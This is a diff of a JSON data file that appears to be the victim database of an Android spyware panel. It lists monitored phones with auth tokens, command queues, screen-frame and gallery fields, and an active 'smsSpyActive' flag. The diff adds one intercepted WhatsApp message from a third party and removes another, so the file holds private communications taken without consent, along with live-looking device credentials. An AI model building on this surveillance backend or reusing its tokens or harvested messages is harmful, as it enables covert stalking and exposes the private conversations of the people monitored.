@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776775615791,
+    "lastSeen": 1776775618809,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (81 pesan): ~ depp storee",
+        "content": "TAWARIN ALL STOK MAS MBK ALL SPEK KE PM",
+        "time": "21/04 19:47",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776775620693
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10320,14 +10328,6 @@
         "time": "21/04 19:20",
         "pkg": "com.whatsapp",
         "receivedAt": 1776774046180
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB byone/mabar ff 8a (47 pesan): Givano",
-        "content": "Oke",
-        "time": "21/04 19:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776774046164
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776775616562,
+    "lastSeen": 1776775619574,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776775617467,
+    "lastSeen": 1776775620499,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
